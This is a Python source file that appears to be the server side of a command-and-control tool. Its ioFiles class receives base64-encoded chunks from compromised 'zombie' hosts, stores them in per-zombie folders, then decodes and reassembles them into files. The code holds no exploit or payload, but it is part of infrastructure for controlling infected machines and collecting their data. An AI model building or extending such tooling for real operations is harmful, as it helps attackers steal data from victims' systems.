from os import makedirs, path, remove, rename
import secrets
from base64 import b64decode
import logging
from datetime import datetime
from pathlib import Path

"""
- Define way to interact with files on disk

"""
logger = logging.getLogger("ioFiles")
logging.basicConfig(level=logging.DEBUG, handlers=[
                        logging.FileHandler(f"c2_dev-{datetime.now().strftime('%Y%m%d_%H%S')}.log"),
                        logging.StreamHandler()
                    ], format="%(asctime)s |%(levelname)s| %(name)s.%(funcName)s => %(message)s    "
                    )

#print(f"[???] in server/ioFiles.py, name is: {__name__}")

"""
REMOVE _build_dirs, expensive checks just to write files


"""


class ioFiles:
    """
    ioFiles is how the server handles pulling and pushing files between the
    zombie and host. 
    """
    def __init__(self,zombieID:str, basePath:str):
        self.zombieID = zombieID
        self.base_path = Path(basePath)
        self.home = self.base_path / "files" / "zombies" / zombieID
        logger.debug(f"home is now: {self.home}")
        self._build_dirs(zombieID)
        self.files = []
        return

    def _build_dirs(self,zombieID:str):
        """
            need to build main zombie folder, then sub folders
        """
        try:
            self.home.mkdir() # first make sure zombie is built
        except FileExistsError as e:
            logger.debug("zombie home already created, skipping")
            post = self.home / "post"
            if post.exists():
                logger.debug("zombie home already setup, skipping")
                return
        except Exception as e:
            logger.error(f"Unable to create directory structure with error {e}")
        pre = self.home / "pre"
        post = self.home / "post"
        #stale = self.home / "stale"
        try:
            pre.mkdir()
            post.mkdir()
            #stale.mkdir()
        except FileExistsError as e:
            logger.debug(f"Couldn't create sub directory with error: {e}")
        except Exception as e:
            logger.error(f"Unable to create directory structure with error {e}")
        



        
    
    def write_chunk(self,data):
        # if(self.is_directory()):
        logger.debug(f"data is type: {type(data)}")
        try:
            # path = f"./files/pre/{zombieID}"
            pre = self.home / "pre"
            token = secrets.token_urlsafe(6)
            path = pre / token
            logger.debug(f"NOW OPENING: {path}")
            try:
                with open(path,'a') as f:
                    res = f.write(data)
                    logger.debug(f"saved {res} bytes")
                    self.files.append(path)
                    f.close()
                    return True
            except FileNotFoundError as e:
                logger.debug("Trying alt")
                with open(path,"w") as f:
                    res = f.write(data)
                    logger.debug(f"Saved {res} bytes")
                    self.files.append(path)
                    f.close()
                    return True  
        except Exception as e:
            logger.error(f"E1: UNABLE TO WRITE CHUNK: {data} for reason: {e}")
            return False
        # else:
        #     print(f"WRITE_CHUNK => E2: UNABLE TO WRITE CHUNK: {data}")
        #     return False
    
    """
    - take the file that was just finished being recived, move it to post directory, and finally remove the original pre file.
        - should be able to do something with split and 'CHUNK:'
    """
    def process_file(self,zombieID:str):
        pre = self.files.pop()
        post = self.home / "post"
        token = secrets.token_urlsafe(6)
        postfile = post / token
        with open(pre,"r") as f:
            pre_file = f.read()
            f.close()
        #prefile should now contain all chunks recieved from client
            # - need to split and decode each chunk before writting
        #print(f"PROCESS_FILE => preprocessed data found: {pre_file}")
        chunks = pre_file.split("CHUNK:")[0:]
        logger.debug(f"FOUND CHUNKS: {len(chunks)}")
        data = "" 
        logger.debug(f"DECODED DATA, WRITTING")
        try:
            for chunk in chunks:
                logger.debug(f"PROCESS_FILE => in for loop, chunk len: {len(chunk)}")
                enc = b64decode(chunk)
                data += enc.decode('utf-8')
            with open(postfile,"a") as f:
                f.write(data)
                f.close()
        except Exception as e:
            logger.error(f"ERROR, COUDLN'T DECODE: {e}")
            logger.debug(f"SAVING RAW CHUNKS.....")
            with open(postfile,"w") as f:
                f.write(pre_file)
                f.close()     
        #print(f"PROCESS_FILE => now saving pre_file data to {postfile}")
        try:
            try:
                logger.debug(f"now removing {pre_file}")
                remove(pre)
                return token
            except:
                logger.error(f"COULDN'T REMOVE {pre}")
                #logger.debug("BACKING UP AND DELETING")
                #files = './files'
                #Rename files directory and move out of way to be recreated by server
                #rename(files,f"./files-{token}")
                #remove(self.pre)
                return None
        except Exception as e:
            logger.error(f"UNABLE TO FAIL SAFELY: {e}")
            return None
        
    
